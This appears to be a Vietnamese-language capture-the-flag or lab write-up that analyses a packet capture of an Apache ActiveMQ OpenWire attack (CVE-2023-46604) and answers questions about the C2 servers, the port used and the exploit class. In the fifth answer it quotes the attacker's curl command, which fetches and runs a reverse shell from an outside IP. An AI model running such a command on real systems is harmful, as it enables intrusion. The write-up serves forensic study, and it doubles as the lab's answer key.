<h1>Q1:</h1>
<h2>Problem</h2>
By identifying the C2 IP, we can block traffic to and from this IP, helping to contain the breach and prevent further data exfiltration or command execution. Can you provide the IP of the C2 server that communicated with our server?
<h2>Solution
</h2>

Trước tiên mình sẽ check conversation giữa các sever 
![image](https://github.com/user-attachments/assets/ebb60552-2c92-4a0c-bd84-046dd7dfa39d)
Nhìn vào đó thì mình thấy được 3 IP khác kết nối tới địa chỉ sever của mình(134.209.197.3). Nhưng trong đó có 4867 packets đã được gửi giữa sever mình với sever IP 146.190.21.92
=> Ans: 146.190.21.92

<h1>Q2:</h1>
<h2>Problem</h2>
Initial entry points are critical to trace back the attack vector. What is the port number of the service the adversary exploited?

<h2>Solution</h2>
Khi nhìn vào packet thứ 4 và 5, mình thấy attacker sử dụng protocol OpenWire để tấn công sever(sau khi research thì mình biết được rằng OpenWire được xây dựng dựa trên nền tảng TCP và sử dụng TCP làm phương tiện truyền tải dữ liệu), sau đó mình vào các packet để check src port

![image](https://github.com/user-attachments/assets/bb104fa6-117f-40f7-a999-4632672b1e93)

=> Ans: 61616
<h1>Q3:</h1>
<h2>Problem</h2>
Following up on the previous question, what is the name of the service found to be vulnerable?

<h2>Solution</h2>
Mình search google xem giao thức OpenWire được dùng cho service nào và tìm được câu trả lời

![Screenshot 2024-08-22 224745](https://github.com/user-attachments/assets/21a77267-2cd8-453f-9048-73672ee48c20)

=> Ans: Apache ActiveMQ
<h1>Q4:</h1>
<h2>Problem</h2>
The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server?

<h2>Solution</h2>
Sau khi nhìn vào phần Conversation, sever của mình còn kết nối với 2 sever khác nữa(128.199.52.72 và 84.239.49.16) nên mình filter từng IP một
<pre>ip.addr==134.209.197.3 && ip.addr==128.199.52.72</pre>

![image](https://github.com/user-attachments/assets/0bcff04d-3446-493d-a36c-4bfccf00d270)

Sau quá trình bắt tay ba bước, mình thấy sever của mình đang gửi một request GET để lấy tài nguyên nên mình follow TCP stream ở packet 34

![image](https://github.com/user-attachments/assets/c2223b7b-809b-4ae0-845f-e8ae8b8f02cc)

 Mình thấy được nội dung trả về là một tệp ELF(định dạng tệp thực thi chuẩn trên các hệ điều hành Linux, Unix), nên mình biết được đây chính là C2 sever
 => Ans: 128.199.52.72
<h1>Q5:</h1>
<h2>Problem</h2>
Attackers usually leave traces on the disk. What is the name of the reverse shell executable dropped on the server?

<h2>Solution</h2>
Khi đọc đến packet 11, mình thấy info của packet là 

_**GET /invoice.xml HTTP/1.1**_
![image](https://github.com/user-attachments/assets/6c94cd22-508f-494c-b3cd-343eb318dced)
Đây là một yêu cầu HTTP GET để lấy file invoice.xml từ máy chủ, nên mình check bằng cách follow TCP Stream và bắt được nội dung của file XML
![image](https://github.com/user-attachments/assets/f8fef9f5-e9d5-4954-b682-6936ff5fa5df)

Sau khi đọc và phân tích nội dung file thì mình kết luận được là trong tệp XML chứa mã độc, trong file đó chứa câu lệnh sau

<pre> curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker </pre>

Câu lệnh trên sẽ tải một tệp từ địa chỉ http://128.199.52.72/docker, sau đó cung cấp quyền thực thi cho tệp docker đó

=> Ans: docker
<h1>Q6:</h1>
<h2>Problem</h2>
What Java class was invoked by the XML file to run the exploit?
<h2>Solution</h2>
Sau khi đọc nội dung của file XML thì mình thấy được class được dùng là "java.lang.ProcessBuilder" 
Đây là một lớp trong Java dùng để tạo và quản lý các process mới. Trong trường hợp này, file XML sử dụng ProcessBuilder để thực thi các lệnh bash trên hệ thống.
=> Ans: java.lang.ProcessBuilder
<h1>Q7:</h1>
<h2>Problem</h2>
To better understand the specific security flaw exploited, can you identify the CVE identifier associated with this vulnerability?
<h2>Solution</h2>
Để tìm được CVE ID thì mình search google với từ khóa " OpenWire CVE là có kết quả

![image](https://github.com/user-attachments/assets/60739179-7872-4ea3-a834-a99fda95ac6a)

=> Ans: CVE-2023-46604

<h1>Q8:</h1>

